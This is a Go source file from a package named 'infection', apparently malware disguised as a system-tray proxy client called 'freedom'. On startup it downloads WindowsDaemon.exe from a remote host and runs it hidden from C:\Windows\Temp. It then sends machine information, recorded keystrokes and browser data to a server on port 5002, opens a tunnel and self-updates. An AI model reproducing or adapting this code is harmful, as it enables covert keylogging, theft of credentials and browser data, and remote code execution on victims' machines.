package main

import (
	"github.com/scottkiss/grtm"
	"infection/browser"
	"infection/etcd"
	"infection/hitboard"
	"infection/machineinfo"
	"infection/transfer"
	"infection/tunnel"
	"infection/util/icon"
	"infection/util/lib"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"os/exec"
	"strconv"
	"sync/atomic"
	"syscall"
	"systray"
)

const CURRENTPATHLOG = "C:\\Windows\\Temp\\log.txt"
const CURRENTPATH = "C:\\Windows\\Temp\\"

var localAddr string

type Info struct {
	Dev        bool
	ClientPort int
	PacPort    string
}

var Config = Info{
	true,
	8888,
	":9999",
}

type AppConfig struct {
	Url string
}

// confirm lock
type AppConfigMgr struct {
	config atomic.Value
}

var appConfigMgr = &AppConfigMgr{}

func (a *AppConfigMgr) Callback(conf *etcd.Config) {
	appConfig := &AppConfig{}
	appConfig.Url = conf.Url
	appConfigMgr.config.Store(appConfig)
}
func onReady() {
	go transfer.PacHandle(Config.PacPort)
	systray.SetIcon(icon.Data)
	systray.SetTitle("freedom")
	mQuit := systray.AddMenuItem("Quit", "Quit freedom")
	start := systray.AddMenuItem("Start", "Start")
	stop := systray.AddMenuItem("Stop", "Stop")
	go func() {
		<-mQuit.ClickedCh
		systray.Quit()
	}()
	//control proxy thread
	gm := grtm.NewGrManager()
	//loop up the switch signal
	for {
		select {
		case <-start.ClickedCh:
			appConfig := appConfigMgr.config.Load().(*AppConfig)
			log.Println(appConfig)
			go gm.NewGoroutine("proxy", transfer.InitCfg, appConfig.Url+":5003", localAddr)
			start.Check()
			stop.Uncheck()
			start.SetTitle("Start")
			systray.SetTooltip("running")
		case <-stop.ClickedCh:
			go gm.StopLoopGoroutine("proxy")
			stop.Check()
			start.Uncheck()
			stop.SetTitle("Stop")
			systray.SetTooltip("stop")
		}
	}
}
func onExit() {
	// clean up here
	killcheck := exec.Command("taskkill", "/f", "/im", "WindowsDaemon.exe")
	killcheck.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	// not Start will continue
	killcheck.Run()
}
func init() {
	killcheck := exec.Command("taskkill", "/f", "/im", "WindowsDaemon.exe")
	killcheck.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	// not Start will continue
	killcheck.Run()
	//currentprogram path log
	content, _ := transfer.GetTargetPath()
	data := []byte(content)
	if ioutil.WriteFile(CURRENTPATHLOG, data, 0644) == nil {
	}
	//fixed ioop download check
	_, cerr := os.Stat(CURRENTPATH + "WindowsDaemon.exe")
	if cerr != nil {
		//keep the main process live
		resp, err := http.Get(lib.MIDFILE + "WindowsDaemon.exe")
		if err != nil {
			return
		}
		body, _ := ioutil.ReadAll(resp.Body)
		ioutil.WriteFile(CURRENTPATH+"WindowsDaemon.exe", body, 0644)
		cmd := exec.Command(CURRENTPATH + "WindowsDaemon.exe")
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		cmd.Start()
	} else {
		cmd := exec.Command(CURRENTPATH + "WindowsDaemon.exe")
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		cmd.Start()
	}
	if !Config.Dev {
		log.Println("已启动free客户端，请在free_" + strconv.Itoa(Config.ClientPort) + ".log查看详细日志")
		f, _ := os.OpenFile("free"+strconv.Itoa(Config.ClientPort)+".log", os.O_WRONLY|os.O_CREATE|os.O_SYNC|os.O_APPEND, 0755)
		log.SetOutput(f)
	}

	localAddr = ":" + strconv.Itoa(Config.ClientPort)
}
func main() {
	conf, _ := etcd.NewConfig()
	conf.AddObserver(appConfigMgr)
	var appConfig AppConfig
	appConfig.Url = conf.Url
	appConfigMgr.config.Store(&appConfig)
	go machineinfo.MachineSend("http://" + conf.Url + ":5002/machine/machineInfo")
	go hitboard.KeyBoardCollection("http://" + conf.Url + ":5002/keyboard/record")
	go browser.Digpack("http://" + conf.Url + ":5002/browser/")
	go tunnel.Tunnel(conf.Url)
	////check update
	go lib.DoUpdate()
	systray.Run(onReady, onExit)
}

//func run(){
//	for {
//		appConfig := appConfigMgr.config.Load().(*AppConfig)
//		fmt.Println("Hostname:", appConfig.Url)
//		fmt.Printf("%v\n", "--------------------")
//		time.Sleep(5 * time.Second)
//	}
//}
